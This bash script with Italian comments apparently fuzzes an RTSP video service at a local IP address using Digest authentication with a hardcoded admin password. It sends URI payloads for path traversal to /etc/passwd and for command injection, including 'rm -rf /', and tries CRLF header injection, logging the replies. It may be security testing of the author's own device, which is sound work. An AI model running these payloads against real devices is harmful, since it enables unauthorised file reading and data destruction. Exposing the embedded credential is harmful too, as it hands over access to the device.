#!/usr/bin/env bash
set -euo pipefail

IP="192.168.2.2"
PORT=554
USER="admin"
PASS="tlJwpbo6"
OUT="fuzz_injection.txt"

# URI‐payloads da testare
URI_PAYLOADS=(
  "/" 
  "/../../../etc/passwd"
  "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "/stream;rm -rf /"
  "/\$(echo injected)"
)

# Header custom per injection
HEADER_PAYLOADS=(
  "X-Test-Header: injected123"
  $'X-CRLF: foo\r\nInjected: yes'
)

# Svuota il log
: > "$OUT"

###############################################################################
# 1) Prendi realm & nonce dal primo 401
###############################################################################
printf 'DESCRIBE rtsp://%s:%d/ RTSP/1.0\r\nCSeq: 1\r\n\r\n' "$IP" "$PORT" \
  | nc "$IP" "$PORT" > /tmp/rtsp401.txt

REALM=$(grep -oE 'realm="[^"]+"' /tmp/rtsp401.txt | cut -d'"' -f2 || echo "")
NONCE=$(grep -oE 'nonce="[^"]+"' /tmp/rtsp401.txt | cut -d'"' -f2 || echo "")

echo "Obtained Digest realm=$REALM nonce=$NONCE" | tee -a "$OUT"

###############################################################################
# Funzione MD5 → esadecimale
###############################################################################
md5_hex(){
  local data="${1:-}"
  printf '%s' "$data" \
    | openssl dgst -md5 -binary \
    | xxd -p -c 256
}

###############################################################################
# 2) Fuzz URI con Digest auth
###############################################################################
for uri in "${URI_PAYLOADS[@]}"; do
  echo "=== URI FUZZ: $uri ===" | tee -a "$OUT"
  HA1=$(md5_hex "${USER}:${REALM}:${PASS}")
  HA2=$(md5_hex "DESCRIBE:rtsp://$IP:$PORT$uri")
  RESPONSE=$(md5_hex "${HA1}:${NONCE}:${HA2}")
  AUTH="Authorization: Digest username=\"$USER\", realm=\"$REALM\", nonce=\"$NONCE\", uri=\"rtsp://$IP:$PORT$uri\", response=\"$RESPONSE\""

  {
    # invia la request + un sleep per tenere il pipe aperto
    printf "DESCRIBE rtsp://%s:%d%s RTSP/1.0\r\n" "$IP" "$PORT" "$uri"
    printf "CSeq: 1\r\n"
    printf "%s\r\n" "$AUTH"
    printf "User-Agent: fuzzRTSP\r\n"
    printf "Accept: application/sdp\r\n\r\n"
    sleep 1
  } | nc "$IP" "$PORT" 2>&1 | tee -a "$OUT"

  echo >>"$OUT"
done

###############################################################################
# 3) Header‐injection su URI "/"
###############################################################################
for hdr in "${HEADER_PAYLOADS[@]}"; do
  echo "=== HEADER INJECTION: $hdr ===" | tee -a "$OUT"
  {
    printf "OPTIONS rtsp://%s:%d/ RTSP/1.0\r\n" "$IP" "$PORT"
    printf "CSeq: 2\r\n"
    printf "%s\r\n" "$hdr"
    printf "User-Agent: fuzzRTSP\r\n\r\n"
    sleep 1
  } | nc "$IP" "$PORT" 2>&1 | tee -a "$OUT"

  echo >>"$OUT"
done

echo -e "\n✅ Done. Vedi i risultati in $OUT\n"

